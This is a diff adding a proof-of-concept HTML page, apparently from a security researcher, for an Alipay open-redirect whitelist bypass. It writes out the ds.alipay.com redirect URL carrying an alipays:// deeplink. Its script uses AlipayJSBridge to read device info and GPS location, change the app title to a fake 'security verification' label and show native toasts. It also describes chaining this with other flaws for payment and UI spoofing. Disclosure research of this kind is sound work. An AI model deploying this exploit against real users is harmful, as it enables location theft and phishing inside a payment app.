@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CVE-6 Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,system-ui,sans-serif;background:#fff;color:#333;padding:16px}
+.banner{background:linear-gradient(135deg,#f5222d,#fa541c);color:#fff;padding:16px;border-radius:10px;text-align:center;margin-bottom:16px}
+.banner h1{font-size:18px}
+.banner p{font-size:12px;opacity:.85;margin-top:4px}
+.result{background:#f6ffed;border:2px solid #52c41a;border-radius:10px;padding:16px;margin:12px 0}
+.result h2{color:#389e0d;font-size:15px;margin-bottom:8px}
+.fail{background:#fff2f0;border-color:#ff4d4f}
+.fail h2{color:#cf1322}
+.chain{background:#f9f0ff;border-color:#b37feb}
+.chain h2{color:#531dab}
+.item{padding:6px 0;border-bottom:1px solid #f0f0f0;font-size:13px}
+.item:last-child{border:none}
+.label{color:#888;font-size:11px}
+.value{color:#333;font-weight:600}
+.warn{background:#fff7e6;border:1px solid #ffd591;border-radius:8px;padding:10px;font-size:11px;color:#d46b08;margin:10px 0;line-height:1.5}
+.ts{color:#999;font-size:10px;text-align:center;margin-top:16px}
+#status{font-size:14px;color:#1677ff;text-align:center;padding:20px}
+</style>
+</head><body>
+
+<div class="banner">
+  <h1>CVE-6: ds.alipay.com Whitelist Bypass</h1>
+  <p>CWE-601 + CWE-939 | CVSS 9.3 | Trusted domain redirect chains to full JSBridge access</p>
+</div>
+
+<div class="warn">
+  <b>Bypass chain:</b> This page was loaded via ds.alipay.com open redirect →
+  alipays:// deeplink → Alipay WebView. The trusted domain (ds.alipay.com) acts as a
+  redirect gateway, bypassing any URL whitelist checks. Result: attacker page at
+  innora.ai gains full JSBridge access identical to CVE-1, but through a whitelisted entry point.
+</div>
+
+<div id="status">Checking environment...</div>
+<div id="results"></div>
+<div class="ts" id="timestamp"></div>
+
+<script>
+var el = document.getElementById('results');
+var status = document.getElementById('status');
+var bridgeData = {};
+
+function render() {
+  var html = '';
+  var isAlipay = /AlipayClient|Nebula/i.test(navigator.userAgent);
+  var hasBridge = !!window.AlipayJSBridge;
+
+  // Environment proof
+  html += '<div class="result"><h2>Environment: Whitelist Bypass Confirmed</h2>';
+  html += '<div class="item"><span class="label">Page Origin: </span><span class="value" style="color:#f5222d">' + location.origin + '</span></div>';
+  html += '<div class="item"><span class="label">Full URL: </span><span class="value" style="word-break:break-all;font-size:10px">' + location.href + '</span></div>';
+  html += '<div class="item"><span class="label">Inside Alipay WebView: </span><span class="value" style="color:' + (isAlipay ? '#52c41a' : '#faad14') + '">' + (isAlipay ? 'YES — CONFIRMED' : 'Detection pending (check UA)') + '</span></div>';
+  html += '<div class="item"><span class="label">AlipayJSBridge: </span><span class="value" style="color:' + (hasBridge ? '#f5222d' : '#faad14') + '">' + (hasBridge ? 'AVAILABLE — CRITICAL' : 'Not yet loaded') + '</span></div>';
+  html += '<div class="item"><span class="label">User Agent: </span><span class="value" style="word-break:break-all;font-size:10px">' + navigator.userAgent + '</span></div>';
+  html += '</div>';
+
+  // Bypass chain explanation
+  html += '<div class="result chain"><h2>Whitelist Bypass Attack Chain</h2>';
+  html += '<div class="item"><span class="label">Step 1 — Entry: </span><span class="value">User clicks link containing https://ds.alipay.com/?scheme=alipays://...</span></div>';
+  html += '<div class="item"><span class="label">Step 2 — Redirect: </span><span class="value">ds.alipay.com (trusted Alipay domain) redirects to alipays:// deeplink</span></div>';
+  html += '<div class="item"><span class="label">Step 3 — Bypass: </span><span class="value">Because ds.alipay.com is whitelisted, the redirect passes all URL validation</span></div>';
+  html += '<div class="item"><span class="label">Step 4 — Load: </span><span class="value">Alipay WebView opens and loads attacker URL from deeplink parameter</span></div>';
+  html += '<div class="item"><span class="label">Step 5 — Access: </span><span class="value" style="color:#f5222d">Attacker page at ' + location.origin + ' gains full JSBridge access</span></div>';
+  html += '</div>';
+
+  // JSBridge proof
+  if (hasBridge) {
+    html += '<div class="result"><h2>JSBridge Access via Whitelist Bypass</h2>';
+
+    if (bridgeData.sysinfo) {
+      html += '<div class="item"><span class="label">Device Model: </span><span class="value">' + (bridgeData.sysinfo.model || 'N/A') + '</span></div>';
+      html += '<div class="item"><span class="label">System: </span><span class="value">' + (bridgeData.sysinfo.system || 'N/A') + '</span></div>';
+      html += '<div class="item"><span class="label">Alipay Version: </span><span class="value">' + (bridgeData.sysinfo.version || 'N/A') + '</span></div>';
+      html += '<div class="item"><span class="label">Platform: </span><span class="value">' + (bridgeData.sysinfo.platform || 'N/A') + '</span></div>';
+    }
+
+    if (bridgeData.titleSet) {
+      html += '<div class="item"><span class="label">setTitle: </span><span class="value" style="color:#f5222d">CALLED — Title changed to fake value via bypass chain</span></div>';
+    }
+
+    if (bridgeData.toastShown) {
+      html += '<div class="item"><span class="label">showToast: </span><span class="value" style="color:#f5222d">CALLED — Native toast displayed via bypass chain</span></div>';
+    }
+
+    if (bridgeData.gps) {
+      if (bridgeData.gps.latitude) {
+        html += '<div class="item"><span class="label">GPS (via bypass): </span><span class="value" style="color:#f5222d">' + bridgeData.gps.latitude + ', ' + bridgeData.gps.longitude + '</span></div>';
+      } else {
+        html += '<div class="item"><span class="label">GPS Result: </span><span class="value">' + JSON.stringify(bridgeData.gps) + '</span></div>';
+      }
+    }
+    html += '</div>';
+
+    // Vulnerability proof
+    html += '<div class="result"><h2>Vulnerability Proof</h2>';
+    html += '<div class="item"><span class="label">Root Cause: </span><span class="value">ds.alipay.com accepts arbitrary "scheme" parameter and performs open redirect</span></div>';
+    html += '<div class="item"><span class="label">Code Evidence: </span><span class="value">stripLandingConfig contains ds.alipay.com with startAppNormal:true</span></div>';
+    html += '<div class="item"><span class="label">Bypass Method: </span><span class="value">https://ds.alipay.com/?scheme=alipays://platformapi/startapp?appId=20000067&url=ATTACKER</span></div>';
+    html += '<div class="item"><span class="label">Why Critical: </span><span class="value" style="color:#f5222d">Defeats any domain whitelist — attack enters through Alipay\'s own trusted domain</span></div>';
+    html += '<div class="item"><span class="label">Escalation: </span><span class="value">Combined with CVE-2/3/4, enables GPS theft + payment + UI spoofing via a single whitelisted link</span></div>';
+    html += '</div>';
+
+    // Comparison with CVE-1
+    html += '<div class="result chain"><h2>CVE-6 vs CVE-1 Comparison</h2>';
+    html += '<div class="item"><span class="label">CVE-1 (Direct): </span><span class="value">alipays://platformapi/startapp?appId=20000067&url=ATTACKER — blocked if app has URL whitelist</span></div>';
+    html += '<div class="item"><span class="label">CVE-6 (Bypass): </span><span class="value" style="color:#f5222d">https://ds.alipay.com/?scheme=alipays://... — passes through trusted domain, bypasses whitelist</span></div>';
+    html += '<div class="item"><span class="label">Additional Risk: </span><span class="value">ds.alipay.com link looks legitimate to users and security filters (HTTPS + alipay.com domain)</span></div>';
+    html += '</div>';
+
+    // Raw data
+    html += '<div class="result"><h2>Raw Collected Data</h2>';
+    html += '<div class="item"><span class="value" style="word-break:break-all;font-size:9px;font-family:monospace">' +
+      JSON.stringify(bridgeData, null, 2).replace(/</g, '&lt;') + '</span></div>';
+    html += '</div>';
+  }
+
+  el.innerHTML = html;
+  document.getElementById('timestamp').textContent = 'Evidence collected at: ' + new Date().toISOString();
+}
+
+function doBridgeTests() {
+  if (!window.AlipayJSBridge) return;
+
+  // getSystemInfo
+  AlipayJSBridge.call('getSystemInfo', {}, function(result) {
+    bridgeData.sysinfo = result || {};
+    render();
+  });
+
+  // setTitle — prove UI control via bypass
+  AlipayJSBridge.call('setTitle', {title: '安全验证中心'}, function(result) {
+    bridgeData.titleSet = true;
+    render();
+  });
+
+  // showToast — prove native toast via bypass
+  setTimeout(function() {
+    AlipayJSBridge.call('showToast', {
+      content: '白名单绕过验证成功',
+      type: 'none',
+      duration: 3000
+    }, function(result) {
+      bridgeData.toastShown = true;
+      render();
+    });
+  }, 1500);
+
+  // getLocation — prove GPS access via bypass
+  setTimeout(function() {
+    AlipayJSBridge.call('getLocation', {type: 2, accuracy: 1}, function(result) {
+      if (result && (result.longitude || result.latitude)) {
+        bridgeData.gps = {
+          latitude: result.latitude,
+          longitude: result.longitude,
+          accuracy: result.accuracy,
+          city: result.city
+        };
+      } else {
+        bridgeData.gps = {error: JSON.stringify(result)};
+      }
+      render();
+    });
+  }, 3000);
+}
+
+function checkBridge() {
+  if (window.AlipayJSBridge) {
+    status.textContent = 'AlipayJSBridge DETECTED via whitelist bypass chain — Full access confirmed';
+    status.style.color = '#f5222d';
+    doBridgeTests();
+  } else {
+    status.textContent = 'Page loaded at ' + location.origin + ' — waiting for bridge...';
+    render();
+  }
+}
+
+document.addEventListener('AlipayJSBridgeReady', function() {
+  checkBridge();
+});
+
+render();
+checkBridge();
+setTimeout(checkBridge, 1000);
+setTimeout(checkBridge, 3000);
+</script>
+</body></html>
